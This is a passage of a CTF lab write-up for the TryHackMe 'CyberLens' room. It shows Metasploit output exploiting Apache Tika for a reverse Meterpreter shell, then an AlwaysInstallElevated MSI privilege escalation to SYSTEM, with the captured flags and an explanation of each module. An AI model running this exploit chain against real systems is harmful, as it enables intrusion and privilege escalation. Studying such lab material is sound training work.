+<span class="w">   </span><span class="n">URIPATH</span><span class="w">                     </span><span class="n">no</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">URI</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="p">(</span><span class="k">default</span><span class="w"> </span><span class="ow">is</span><span class="w"> </span><span class="n">random</span><span class="p">)</span>
+<span class="w">   </span><span class="n">VHOST</span><span class="w">                       </span><span class="n">no</span><span class="w">        </span><span class="n">HTTP</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">virtual</span><span class="w"> </span><span class="n">host</span>
+
+
+<span class="w">   </span><span class="k">When</span><span class="w"> </span><span class="n">CMDSTAGER</span><span class="p">::</span><span class="n">FLAVOR</span><span class="w"> </span><span class="ow">is</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">auto</span><span class="p">,</span><span class="n">tftp</span><span class="p">,</span><span class="n">wget</span><span class="p">,</span><span class="n">curl</span><span class="p">,</span><span class="n">fetch</span><span class="p">,</span><span class="n">lwprequest</span><span class="p">,</span><span class="n">psh_invokewebrequest</span><span class="p">,</span><span class="n">ftp_http</span><span class="p">:</span>
+
+<span class="w">   </span><span class="n">Name</span><span class="w">     </span><span class="n">Current</span><span class="w"> </span><span class="n">Setting</span><span class="w">  </span><span class="n">Required</span><span class="w">  </span><span class="n">Description</span>
+<span class="w">   </span><span class="o">----</span><span class="w">     </span><span class="o">---------------</span><span class="w">  </span><span class="o">--------</span><span class="w">  </span><span class="o">-----------</span>
+<span class="w">   </span><span class="n">SRVHOST</span><span class="w">  </span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="w">          </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">network</span><span class="w"> </span><span class="k">interface</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">listen</span><span class="w"> </span><span class="k">on</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">machine</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">liste</span>
+<span class="w">                                       </span><span class="n">n</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">addresses</span><span class="p">.</span>
+<span class="w">   </span><span class="n">SRVPORT</span><span class="w">  </span><span class="mi">8080</span><span class="w">             </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">listen</span><span class="w"> </span><span class="k">on</span><span class="p">.</span>
+
+
+<span class="n">Payload</span><span class="w"> </span><span class="n">options</span><span class="w"> </span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="p">):</span>
+
+<span class="w">   </span><span class="n">Name</span><span class="w">      </span><span class="n">Current</span><span class="w"> </span><span class="n">Setting</span><span class="w">  </span><span class="n">Required</span><span class="w">  </span><span class="n">Description</span>
+<span class="w">   </span><span class="o">----</span><span class="w">      </span><span class="o">---------------</span><span class="w">  </span><span class="o">--------</span><span class="w">  </span><span class="o">-----------</span>
+<span class="w">   </span><span class="n">EXITFUNC</span><span class="w">  </span><span class="n">process</span><span class="w">          </span><span class="n">yes</span><span class="w">       </span><span class="k">Exit</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="p">(</span><span class="n">Accepted</span><span class="p">:</span><span class="w"> </span><span class="c">&#39;&#39;, seh, thread, process, none)</span>
+<span class="w">   </span><span class="n">LHOST</span><span class="w">     </span><span class="mf">10.21</span><span class="p">.</span><span class="mf">16.42</span><span class="w">      </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">listen</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="n">an</span><span class="w"> </span><span class="k">interface</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">specified</span><span class="p">)</span>
+<span class="w">   </span><span class="n">LPORT</span><span class="w">     </span><span class="mi">4444</span><span class="w">             </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">listen</span><span class="w"> </span><span class="n">port</span>
+
+
+<span class="n">Exploit</span><span class="w"> </span><span class="n">target</span><span class="p">:</span>
+
+<span class="w">   </span><span class="n">Id</span><span class="w">  </span><span class="n">Name</span>
+<span class="w">   </span><span class="o">--</span><span class="w">  </span><span class="o">----</span>
+<span class="w">   </span><span class="mi">0</span><span class="w">   </span><span class="n">Windows</span>
+
+
+
+<span class="n">View</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">full</span><span class="w"> </span><span class="k">module</span><span class="w"> </span><span class="nn">info</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">info</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">command</span><span class="p">.</span>
+<span class="n">msf</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">apache_tika_jp2_jscript</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">exploit</span>
+</code></pre></div>
+
+<p>and get reverseshell connection</p>
+<div class="codehilite"><pre><span></span><code>meterpreter &gt; 
+meterpreter &gt; pwd
+C:\Windows\system32
+
+meterpreter &gt; cd ../../users
+meterpreter &gt; pwd
+C:\users
+meterpreter &gt; ls
+Listing: C:\users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  8192  dir   2025-10-09 08:41:58 -0400  Administrator
+040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  All Users
+040777/rwxrwxrwx  8192  dir   2023-11-25 02:31:22 -0500  CyberLens
+040555/r-xr-xr-x  8192  dir   2021-03-17 10:58:07 -0400  Default
+040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  Default User
+040555/r-xr-xr-x  4096  dir   2018-12-12 02:45:15 -0500  Public
+100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini
+
+meterpreter &gt; cd CyberLens
+meterpreter &gt; ls
+Listing: C:\users\CyberLens
+
+meterpreter &gt; cd Desktop
+meterpreter &gt; ls
+Listing: C:\users\CyberLens\Desktop
+===================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
+100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
+100666/rw-rw-rw-  282   fil   2023-06-06 15:48:33 -0400  desktop.ini
+100666/rw-rw-rw-  25    fil   2023-06-06 15:54:19 -0400  user.txt
+
+meterpreter &gt; cat user.txt
+THM{T1k4-CV3-f0r-7h3-w1n}
+meterpreter &gt; 
+</code></pre></div>
+
+<p>To find admin.txt also use msfconsole but use another payload and module</p>
+<div class="codehilite"><pre><span></span><code>msf &gt; search use multi/recon/local_exploit_suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   <span class="k">-</span>  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf &gt; search /windows/local/always_install_elevated
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   <span class="k">-</span>  ----                                           ---------------  ----       -----  -----------
+   0  exploit/windows/local/always_install_elevated  2010-03-18       excellent  Yes    Windows AlwaysInstallElevated MSI
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/always_install_elevated
+
+msf &gt; 
+</code></pre></div>
+
+<p>So use this</p>
+<div class="codehilite"><pre><span></span><code><span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">background</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Backgrounding</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="mf">1.</span><span class="o">..</span>
+<span class="n">msf</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">apache_tika_jp2_jscript</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>
+<span class="n">msf</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">apache_tika_jp2_jscript</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span>
+<span class="n">msf</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">always_install_elevated</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">configured</span><span class="p">,</span><span class="w"> </span><span class="n">defaulting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">msf</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">always_install_elevated</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">SESSION</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">SESSION</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">msf</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">always_install_elevated</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">exploit</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Started</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">TCP</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mf">10.21</span><span class="o">.</span><span class="mf">16.42</span><span class="p">:</span><span class="mi">4444</span><span class="w"> </span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Uploading</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">MSI</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">CYBERL</span><span class="o">~</span><span class="mi">1</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Temp</span>\<span class="mi">1</span>\<span class="n">NcivPhvsVr</span><span class="o">.</span><span class="n">msi</span><span class="w"> </span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Executing</span><span class="w"> </span><span class="n">MSI</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="n">stage</span><span class="w"> </span><span class="p">(</span><span class="mi">177734</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.201</span><span class="o">.</span><span class="mf">116.26</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Deleted</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">CYBERL</span><span class="o">~</span><span class="mi">1</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Temp</span>\<span class="mi">1</span>\<span class="n">NcivPhvsVr</span><span class="o">.</span><span class="n">msi</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Meterpreter</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">opened</span><span class="w"> </span><span class="p">(</span><span class="mf">10.21</span><span class="o">.</span><span class="mf">16.42</span><span class="p">:</span><span class="mi">4444</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mf">10.201</span><span class="o">.</span><span class="mf">116.26</span><span class="p">:</span><span class="mi">49941</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">09</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">52</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span>
+
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">pwd</span>
+<span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span>
+
+
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">../../</span>
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">pwd</span>
+<span class="n">C</span><span class="p">:</span>\
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">users</span>
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">pwd</span>
+<span class="n">C</span><span class="p">:</span>\<span class="n">users</span>
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">Listing</span><span class="p">:</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">users</span>
+<span class="o">=================</span>
+
+<span class="n">Mode</span><span class="w">              </span><span class="n">Size</span><span class="w">  </span><span class="n">Type</span><span class="w">  </span><span class="n">Last</span><span class="w"> </span><span class="n">modified</span><span class="w">              </span><span class="n">Name</span>
+<span class="o">----</span><span class="w">              </span><span class="o">----</span><span class="w">  </span><span class="o">----</span><span class="w">  </span><span class="o">-------------</span><span class="w">              </span><span class="o">----</span>
+<span class="mi">040777</span><span class="o">/</span><span class="n">rwxrwxrwx</span><span class="w">  </span><span class="mi">8192</span><span class="w">  </span><span class="n">dir</span><span class="w">   </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">09</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">58</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">Administrator</span>
+<span class="mi">040777</span><span class="o">/</span><span class="n">rwxrwxrwx</span><span class="w">  </span><span class="mi">0</span><span class="w">     </span><span class="n">dir</span><span class="w">   </span><span class="mi">2018</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="w"> </span><span class="mi">03</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">48</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">All</span><span class="w"> </span><span class="n">Users</span>
+<span class="mi">040777</span><span class="o">/</span><span class="n">rwxrwxrwx</span><span class="w">  </span><span class="mi">8192</span><span class="w">  </span><span class="n">dir</span><span class="w">   </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">25</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">22</span><span class="w"> </span><span class="o">-</span><span class="mi">0500</span><span class="w">  </span><span class="n">CyberLens</span>
+<span class="mi">040555</span><span class="o">/</span><span class="n">r</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">8192</span><span class="w">  </span><span class="n">dir</span><span class="w">   </span><span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">17</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">07</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">Default</span>
+<span class="mi">040777</span><span class="o">/</span><span class="n">rwxrwxrwx</span><span class="w">  </span><span class="mi">0</span><span class="w">     </span><span class="n">dir</span><span class="w">   </span><span class="mi">2018</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="w"> </span><span class="mi">03</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">48</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">Default</span><span class="w"> </span><span class="n">User</span>
+<span class="mi">040555</span><span class="o">/</span><span class="n">r</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">4096</span><span class="w">  </span><span class="n">dir</span><span class="w">   </span><span class="mi">2018</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">12</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">15</span><span class="w"> </span><span class="o">-</span><span class="mi">0500</span><span class="w">  </span><span class="n">Public</span>
+<span class="mi">100666</span><span class="o">/</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w">  </span><span class="mi">174</span><span class="w">   </span><span class="n">fil</span><span class="w">   </span><span class="mi">2018</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">15</span><span class="w"> </span><span class="mi">03</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">48</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">desktop</span><span class="o">.</span><span class="n">ini</span>
+
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">Administrator</span>
+
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">Desktop</span>
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">Listing</span><span class="p">:</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+<span class="o">=======================================</span>
+
+<span class="n">Mode</span><span class="w">              </span><span class="n">Size</span><span class="w">  </span><span class="n">Type</span><span class="w">  </span><span class="n">Last</span><span class="w"> </span><span class="n">modified</span><span class="w">              </span><span class="n">Name</span>
+<span class="o">----</span><span class="w">              </span><span class="o">----</span><span class="w">  </span><span class="o">----</span><span class="w">  </span><span class="o">-------------</span><span class="w">              </span><span class="o">----</span>
+<span class="mi">100666</span><span class="o">/</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w">  </span><span class="mi">527</span><span class="w">   </span><span class="n">fil</span><span class="w">   </span><span class="mi">2016</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">21</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">17</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">EC2</span><span class="w"> </span><span class="n">Feedback</span><span class="o">.</span><span class="n">website</span>
+<span class="mi">100666</span><span class="o">/</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w">  </span><span class="mi">554</span><span class="w">   </span><span class="n">fil</span><span class="w">   </span><span class="mi">2016</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">21</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">23</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">EC2</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Guide</span><span class="o">.</span><span class="n">website</span>
+<span class="mi">100666</span><span class="o">/</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w">  </span><span class="mi">24</span><span class="w">    </span><span class="n">fil</span><span class="w">   </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">27</span><span class="w"> </span><span class="mi">14</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">45</span><span class="w"> </span><span class="o">-</span><span class="mi">0500</span><span class="w">  </span><span class="n">admin</span><span class="o">.</span><span class="n">txt</span>
+<span class="mi">100666</span><span class="o">/</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="w">  </span><span class="mi">282</span><span class="w">   </span><span class="n">fil</span><span class="w">   </span><span class="mi">2021</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">17</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="o">-</span><span class="mi">0400</span><span class="w">  </span><span class="n">desktop</span><span class="o">.</span><span class="n">ini</span>
+
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">admin</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">THM</span><span class="p">{</span><span class="mi">3</span><span class="n">lev</span><span class="err">@</span><span class="n">t3D</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="n">pr1v35c</span><span class="o">!</span><span class="p">}</span>
+<span class="n">meterpreter</span><span class="w"> </span><span class="o">&gt;</span>
+</code></pre></div>
+
+<h1><code>exploit/windows/http/apache_tika_jp2_jscript</code> — <em>remote exploit / initial access</em></h1>
+<p><strong>Goal:</strong> get a remote shell (a Meterpreter session) on the target by abusing an Apache Tika server.</p>
+<p><strong>What it does (high level):</strong></p>
+<ul>
+<li>
+<p>The module targets a specific vulnerability in Apache Tika that allows the attacker to send specially crafted HTTP requests (usually PUT to <code>/meta</code>) that cause the server to interpret attacker-supplied data as script/commands.</p>
+</li>
+<li>
+<p>Metasploit’s module sends a small <em>command stager</em> (chunks of a payload) via HTTP requests that the server writes/executes.</p>
+</li>
+<li>
+<p>The stager arranges for the target to download and run a larger payload (the Meterpreter <em>stage</em>). Once the stage runs, you get an interactive Meterpreter session back to your listener (LHOST:LPORT).</p>
+</li>
+</ul>
+<p><strong>What happens on the network / target:</strong></p>
+<ul>
+<li>
+<p>Your msfconsole opens a listener on your machine.</p>
+</li>
+<li>
+<p>The exploit sends multiple HTTP PUT requests to the target (e.g. <code>PUT /meta</code>) carrying parts of the stager.</p>
+</li>
+<li>
+<p>The target processes those requests, ends up executing the stager (because of the vulnerability), which then downloads/executes the Meterpreter payload.</p>
+</li>
+<li>
+<p>After the stage runs, a TCP connection is made back to your machine and <code>Meterpreter session X opened</code> appears.</p>
+</li>
+</ul>
+<p><strong>What Meterpreter gives you:</strong></p>
+<ul>
+<li>
+<p>An interactive agent with many built-in commands: <code>sysinfo</code>, <code>getuid</code>, <code>ls</code>, <code>cat</code>, <code>upload</code>, <code>download</code>, <code>shell</code> (drops into cmd.exe), and helpers for post-exploitation.</p>
+</li>
+<li>
+<p>This is typically a <strong>low-privilege</strong> account (not SYSTEM/Administrator) unless the exploit already gave higher privileges.</p>
+</li>
+</ul>
+<hr />
+<h1><code>multi/recon/local_exploit_suggester</code> — <em>post-exploit reconnaissance</em></h1>
+<p><strong>Goal:</strong> with an existing session, scan the target’s environment and recommend <em>local</em> Metasploit modules that are likely to escalate privileges.</p>
+<p><strong>What it does (high level):</strong></p>
+<ul>
+<li>
+<p>It <strong>does not exploit</strong> anything. Instead, it enumerates the host (via your session) and runs the <code>check</code> routine of many local exploit modules that exist in your Metasploit installation.</p>
+</li>
+<li>
+<p>Each local exploit module usually implements a <code>check</code> method that inspects the system (kernel version, installed patches, registry values, services, SUID bits, file permissions, etc.) and returns whether the vulnerability <em>looks</em> exploitable.</p>
+</li>
+<li>
+<p>The suggester aggregates the checks and prints a list of candidate local exploits (with indications like “appears vulnerable”, “failed check”, or error).</p>
+</li>
+</ul>
+<p><strong>What happens on the victim:</strong></p>
+<ul>
+<li>
+<p>The suggester calls Meterpreter commands or runs lightweight probes on the target to collect info (OS, architecture, patch level, registry keys, installed programs).</p>
+</li>
+<li>
+<p>For each local exploit it runs the exploit module’s <code>check</code> (which usually reads files/registry or runs harmless commands). This is mostly read/enum activity — not destructive.</p>
+</li>
+</ul>
+<p><strong>Why run it:</strong></p>
+<ul>
+<li>
+<p>Saves time and reduces trial-and-error. Rather than blindly trying many LPEs that might crash or do nothing, the suggester narrows down plausible candidates.</p>
+</li>
+<li>
+<p>Still requires manual verification: <code>check</code> can give false positives/negatives. You should <code>use</code> the suggested exploit and run <code>check</code>/inspect code/options before running <code>exploit</code>.</p>
+</li>
+</ul>
+<hr />
+<h1><code>exploit/windows/local/always_install_elevated</code> — <em>local privilege escalation (LPE)</em></h1>
+<p><strong>Goal:</strong> escalate from a normal user to SYSTEM/Administrator on Windows when the machine has a specific misconfiguration.</p>
+<p><strong>What it targets:</strong> the Windows Group Policy setting <strong>AlwaysInstallElevated</strong> (when set to <code>1</code> in either HKCU or HKLM), which makes MSI package installations run with SYSTEM privileges.</p>
+<p><strong>What it does (high level):</strong></p>
+<ul>
+<li>The module creates a <strong>malicious MSI installer</strong> that contains payload code (a Meterpreter or other payload).</li>
+<li>It transfers the MSI to the target (via the existing session), then calls <code>msiexec</code> or otherwise triggers Windows Installer to install that MSI.</li>
+<li>Because the policy is enabled, Windows installs the MSI with <strong>SYSTEM</strong> privileges—so the payload inside the MSI runs as SYSTEM.</li>
+<li>The module sets up a new payload/listener and you receive a new Meterpreter session running as SYSTEM (higher privileged session).</li>
+</ul>
+<p><strong>What happens on the victim:</strong></p>
+<ul>
+<li>The exploit writes an MSI file somewhere on disk.</li>
+<li>The exploit executes the MSI using standard Windows installer mechanisms (like <code>msiexec</code>).</li>
+<li>Windows Installer runs the MSI code as SYSTEM due to the policy; the payload runs and opens a privileged callback to your listener.</li>
+<li>You get a second session (or replace the session) that has SYSTEM/Administrator privileges.</li>
+</ul>
+<p><strong>Important note:</strong> this <strong>only works</strong> if <code>AlwaysInstallElevated</code> is enabled (checked via registry). If not enabled, the MSI will run with the user’s privilege and the exploit fails.</p>
+<hr />
+<ol>
+<li>
+<p><strong>Find a remote vulnerability</strong> (Apache Tika) → use <code>exploit/windows/http/apache_tika_jp2_jscript</code>.<br />
+    Result: you get a Meterpreter session (initial foothold).</p>
+</li>
+<li>
+<p><strong>Enumerate for escalation options</strong> → run <code>multi/recon/local_exploit_suggester</code> against that session.<br />
+    Result: a shortlist of local exploits that look promising (e.g., AlwaysInstallElevated flagged).</p>
+</li>
+<li>
+<p><strong>Use the chosen local exploit</strong> → <code>use exploit/windows/local/always_install_elevated</code>; <code>set SESSION &lt;id&gt;</code>; <code>exploit</code>.<br />
+    Result: the module builds and runs an MSI installer on target and (if successful) gives you a SYSTEM session. Then you <code>cd</code> into <code>C:\Users\Administrator\Desktop</code> and <code>cat admin.txt</code> — admin flag acquired.</p>
+</li>
+</ol>
+        </div>
+    </article>
+</body>
+</html>
